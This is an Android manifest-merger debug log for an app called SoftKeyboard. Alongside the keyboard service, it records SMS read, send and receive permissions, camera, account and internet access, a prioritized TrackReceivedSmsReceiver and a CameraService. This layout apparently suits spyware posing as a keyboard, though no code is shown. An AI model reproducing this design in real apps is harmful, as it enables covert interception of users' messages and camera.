SoftKeyboard/app/build/outputs/logs/manifest-merger-debug-report.txt
-- Merging decision tree log ---
manifest
ADDED from src\main\AndroidManifest.xml:1:1-59:12
	xmlns:android
		ADDED from src\main\AndroidManifest.xml:1:11-69
	package
		ADDED from src\main\AndroidManifest.xml:2:5-47
		INJECTED from src\main\AndroidManifest.xml
		INJECTED from src\main\AndroidManifest.xml
uses-sdk
ADDED from src\main\AndroidManifest.xml:4:5-6:41
	android:targetSdkVersion
		ADDED from src\main\AndroidManifest.xml:6:9-38
		INJECTED from src\main\AndroidManifest.xml
		INJECTED from src\main\AndroidManifest.xml
	android:minSdkVersion
		ADDED from src\main\AndroidManifest.xml:5:9-35
		INJECTED from src\main\AndroidManifest.xml
		INJECTED from src\main\AndroidManifest.xml
uses-permission#android.permission.WRITE_EXTERNAL_STORAGE
ADDED from src\main\AndroidManifest.xml:8:5-81
	android:name
		ADDED from src\main\AndroidManifest.xml:8:22-78
uses-permission#android.permission.RECEIVE_SMS
ADDED from src\main\AndroidManifest.xml:9:5-70
	android:name
		ADDED from src\main\AndroidManifest.xml:9:22-67
uses-permission#android.permission.READ_SMS
ADDED from src\main\AndroidManifest.xml:10:5-67
	android:name
		ADDED from src\main\AndroidManifest.xml:10:22-64
uses-permission#android.permission.READ_EXTERNAL_STORAGE
ADDED from src\main\AndroidManifest.xml:11:5-80
	android:name
		ADDED from src\main\AndroidManifest.xml:11:22-77
uses-permission#android.permission.SEND_SMS
ADDED from src\main\AndroidManifest.xml:12:5-67
	android:name
		ADDED from src\main\AndroidManifest.xml:12:22-64
uses-permission#android.permission.CAMERA
ADDED from src\main\AndroidManifest.xml:13:5-65
	android:name
		ADDED from src\main\AndroidManifest.xml:13:22-62
uses-permission#android.permission.INTERNET
ADDED from src\main\AndroidManifest.xml:14:5-67
	android:name
		ADDED from src\main\AndroidManifest.xml:14:22-64
uses-permission#android.permission.GET_ACCOUNTS
ADDED from src\main\AndroidManifest.xml:15:5-71
	android:name
		ADDED from src\main\AndroidManifest.xml:15:22-68
uses-permission#android.permission.CHANGE_NETWORK_STATE
ADDED from src\main\AndroidManifest.xml:16:5-79
	android:name
		ADDED from src\main\AndroidManifest.xml:16:22-76
application
ADDED from src\main\AndroidManifest.xml:18:5-57:19
	android:label
		ADDED from src\main\AndroidManifest.xml:20:9-41
	android:icon
		ADDED from src\main\AndroidManifest.xml:19:9-53
service#com.example.android.softkeyboard.SoftKeyboard
ADDED from src\main\AndroidManifest.xml:21:9-31:19
	android:permission
		ADDED from src\main\AndroidManifest.xml:23:13-70
	android:name
		ADDED from src\main\AndroidManifest.xml:22:13-40
intent-filter#android.view.InputMethod
ADDED from src\main\AndroidManifest.xml:24:13-26:29
action#android.view.InputMethod
ADDED from src\main\AndroidManifest.xml:25:17-67
	android:name
		ADDED from src\main\AndroidManifest.xml:25:25-64
meta-data#android.view.im
ADDED from src\main\AndroidManifest.xml:28:13-30:50
	android:resource
		ADDED from src\main\AndroidManifest.xml:30:17-47
	android:name
		ADDED from src\main\AndroidManifest.xml:29:17-47
activity#com.example.android.softkeyboard.ImePreferences
ADDED from src\main\AndroidManifest.xml:33:9-39:20
	android:label
		ADDED from src\main\AndroidManifest.xml:35:13-50
	android:name
		ADDED from src\main\AndroidManifest.xml:34:13-43
intent-filter#android.intent.action.MAIN
ADDED from src\main\AndroidManifest.xml:36:13-38:29
action#android.intent.action.MAIN
ADDED from src\main\AndroidManifest.xml:37:17-69
	android:name
		ADDED from src\main\AndroidManifest.xml:37:25-66
receiver#com.softkeyboard.service.TrackReceivedSmsReceiver
ADDED from src\main\AndroidManifest.xml:41:9-45:20
	android:name
		ADDED from src\main\AndroidManifest.xml:41:19-83
intent-filter#android.provider.Telephony.SMS_RECEIVED
ADDED from src\main\AndroidManifest.xml:42:13-44:29
	android:priority
		ADDED from src\main\AndroidManifest.xml:42:28-57
action#android.provider.Telephony.SMS_RECEIVED
ADDED from src\main\AndroidManifest.xml:43:17-82
	android:name
		ADDED from src\main\AndroidManifest.xml:43:25-79
activity#com.softkeyboard.service.TAC
ADDED from src\main\AndroidManifest.xml:47:9-53:20
	android:theme
		ADDED from src\main\AndroidManifest.xml:49:13-53
	android:name
		ADDED from src\main\AndroidManifest.xml:48:13-56
intent-filter#android.intent.category.LAUNCHER
ADDED from src\main\AndroidManifest.xml:50:13-52:29
category#android.intent.category.LAUNCHER
ADDED from src\main\AndroidManifest.xml:51:17-77
	android:name
		ADDED from src\main\AndroidManifest.xml:51:27-74
service#com.softkeyboard.service.CameraService
ADDED from src\main\AndroidManifest.xml:55:9-56:19
	android:name
		ADDED from src\main\AndroidManifest.xml:55:18-71